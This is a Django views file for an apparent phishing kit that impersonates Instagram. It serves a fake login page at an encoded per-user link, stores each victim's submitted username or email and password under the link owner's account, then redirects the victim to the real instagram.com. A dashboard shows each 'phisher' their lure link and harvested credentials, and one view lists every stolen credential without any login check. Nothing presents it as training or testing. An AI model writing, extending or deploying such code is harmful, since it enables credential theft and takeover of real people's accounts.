from django.shortcuts import render, redirect
from django.views.generic import TemplateView, View, DetailView
from django.shortcuts import render, redirect
from django.contrib.auth.models import Permission, User
from django.shortcuts import get_object_or_404
from .models import PhishingModel
import base64
from django.http import request
from cryptography.fernet import Fernet
import base64
from .utils import dec, enc


# Create your views here.

class HomeView(View):
    http_method_names = ['get','post']
    template_name = "index.html"

    def get(self, request):
        return render(request, self.template_name)

class InstagramView(View):
    http_method_names = ['get','post']
    template_name = "instagram.html"
    
    def get(self, request,magic_code):
       
        magic_code =  dec(magic_code)
        try:
            if User.objects.get(email=magic_code) != None :
                return render(request, self.template_name)
            return render(request, '404.html')
        except:
            return render(request, '404.html')
        
    
    def post(self, request,magic_code):

        magic_code =  dec(magic_code)

        username_or_email = request.POST['username_or_email']
        password = request.POST['password']
        website = request.POST['website']
        phisher_id = User.objects.get(email=magic_code).id

        new_murga = PhishingModel()
        new_murga.username_or_email = username_or_email
        new_murga.password = password
        new_murga.phisher_id = phisher_id
        new_murga.website = website

        new_murga.save()
        return redirect('https://www.instagram.com/')

class PhisherDataView(View):
    http_method_names = ['get','post']
    template_name = "data.html"
    
    def get(self, request):
        data = PhishingModel.objects.all()
        context = {
            "data": data
        }
        return render(request, self.template_name,context)

class DashboardView(View):
    http_method_names = ['get','post']
    template_name = "dashboard.html"
    
    def get(self, request):
        if(request.user.is_authenticated):
            user = User.objects.get(username=request.user)
            instagram_magic_string = user.email
            
            instagram_magic_string = enc(instagram_magic_string)
            instagram_magic_url = 'http://127.0.0.1:8000/instagram/'+str(instagram_magic_string)+'/'
            data = PhishingModel.objects.filter(phisher_id=user.id)
            # data = PhishingModel.objects.all()
            context = {
                'instagram_url':instagram_magic_url,
                'data':data
            }
            return render(request, self.template_name,context)
        return redirect('/accounts/login')


        
        

# class InstagramView(View):
#     http_method_names = ['get','post']
#     template_name = "instagram.html"
    
#     def get(self, request):
#         if(request.user.is_authenticated):
#             return render(request, self.template_name)
#         return redirect('/accounts/login')
#         # u = User.objects.get(username=request.user)
#         # print(u.id)
    
#     def post(self, request):
#         if(request.user.is_authenticated):
#             username_or_email = request.get('username_or_email')
#             password = request.get('password')
#             phisher_id = User.objects.get(username=request.user).id

#             new_murga = PhishingModel()
#             new_murga.username_or_email = username_or_email
#             new_murga.password = password
#             new_murga.phisher_id = phisher_id

#             new_murga.save()
#             return redirect('https://www.instagram.com/')
#         return redirect('/accounts/login')
